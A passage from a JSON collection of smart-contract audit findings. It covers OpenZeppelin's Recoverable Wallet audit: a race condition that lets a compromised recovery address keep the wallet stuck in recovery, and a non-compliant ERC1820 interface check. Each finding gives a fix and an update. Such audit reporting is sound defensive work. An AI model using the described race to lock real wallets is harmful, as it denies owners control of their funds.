has called the `cancel_recovery()` function, there exists a race condition during which the compromised address attempts to call `start_recovery()` again before the owner can call `remove_recovery_address(<compromised_address>)`. If successful, a compromised recovery address can keep the contract in a recovery state, thereby preventing any calls to any function with the `only_outside_recovery` modifier — including the `deploy` and `execute` functions.\n\n\nIf compromised recovery addresses are within the scope of the threat model, consider adding a function with the `only_owner` and `only_during_recovery` modifiers that cancels the recovery process and removes the compromised address in a single function call.\n\n\n***Update:*** *A new function (**`cancelRecoveryAndRemoveRecoveryAddress`**), has been added which allows the owner to cancel the recovery process and remove the offending recovery address in a single transaction.*",
      "summary": "\nThe `RecoverableWallet` contract allows the owner to register a list of recovery addresses that can be used to recover the wallet in the event of an emergency. Each recovery address is associated with a `_recovery_delay_in_days` that determines its priority. The owner can remove recovery addresses at any time, unless the contract is in the “in recovery” state. In this case, the owner must first call the `cancel_recovery` function before calling `remove_recovery_address`.\n\nHowever, there was a race condition in which a compromised recovery address could call `start_recovery` again before the owner could call `remove_recovery_address`, thus preventing the owner from calling any function with the `only_outside_recovery` modifier. To address this, a new function (`cancelRecoveryAndRemoveRecoveryAddress`) has been added which allows the owner to cancel the recovery process and remove the compromised address in a single transaction.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11772",
      "title": "Contract does not conform to the ERC1820 specification",
      "impact": "MEDIUM",
      "content": "The [ERC1820](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1820.md) standard defines a universal registry where addresses can register the interfaces they support. The specification requires that compliant contracts have a `canImplementInterfaceForAddress(bytes32 interfaceHash, address addr)` function that returns the `ERC1820_ACCEPT_MAGIC` constant *if and only if* the contract implements the interface (`interfaceHash`) for a given address (`addr`).\n\n\nImportantly, EIP1820 [specifies](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1820.md#interface-implementation-erc1820implementerinterface):\n\n\n\n> If [the contract] does not implement the `interfaceHash` for a given address (`addr`), [the `canImplementInterfaceForAddress` function] MUST NOT return `ERC1820_ACCEPT_MAGIC`.\n> \n> \n\n\nOn [line 12 of](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L12) [recoverable-wallet.sol](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L12) the `Erc777TokensRecipient` contract implements a `canImplementInterfaceForAddress` function which returns the `ERC1820_ACCEPT_MAGIC` constant on all inputs. This would indicate to an external caller that the contract implements all interfaces for all addresses.\n\n\nConsider modifying this function so that it returns `ERC1820_ACCEPT_MAGIC` only when `interfaceHash` is `keccak256(abi.encodePacked(“ERC777TokensRecipient”)` and `addr` is `address(this)`.\n\n\nAdditionally, the ERC1820 standard defines the `canImplementInterfaceForAddress(bytes32 interfaceHash, address addr)` function with `bytes32 interfaceHash` as the first parameter and `address addr` as the second parameter. However, the implementation on [line 12 of recoverable-wallet.sol](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L12) has these parameters reversed. We recommend changing the order of these parameters so the `canImplementInterfaceForAddress` function complies with the ERC1820 specification.\n\n\n***Update:*** *The**`canImplementInterfaceForAddress`* *function has been modified to conform with the ERC1820 standard. Note that the comments in lines 18 and 21 are still using* *`addr`**, yet the variable has been renamed to* *`_implementer`**.*",
      "summary": "\nThis bug report is about the ERC1820 standard. This standard defines a universal registry where addresses can register the interfaces they support. The ERC1820 specification requires that compliant contracts have a `canImplementInterfaceForAddress(bytes32 interfaceHash, address addr)` function that returns the `ERC1820_ACCEPT_MAGIC` constant only if the contract implements the interface (`interfaceHash`) for a given address (`addr`). \n\nHowever, the implementation of the `canImplementInterfaceForAddress` function on line 12 of the recoverable-wallet.sol contract returns the `ERC1820_ACCEPT_MAGIC` constant on all inputs. This means the contract is indicating to an external caller that it implements all interfaces for all addresses which is not in compliance with the ERC1820 standard. \n\nThe bug report recommends modifying the `canImplementInterfaceForAddress` function so that it returns `ERC1820_ACCEPT_MAGIC` only when `interfaceHash` is `keccak256(abi.encodePacked(“ERC777TokensRecipient”)` and `addr` is `address(this)`. Additionally, the order of the parameters should be changed so the `canImplementInterfaceForAddress` function complies with the ERC1820 specification. \n\nThe bug report has been updated to say that the `canImplementInterfaceForAddress` function has been modified to conform with the ERC1820 standard. The comments in lines 18 and 21 are still using `addr`, yet the variable has been renamed to `_implementer`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    }
  ]
}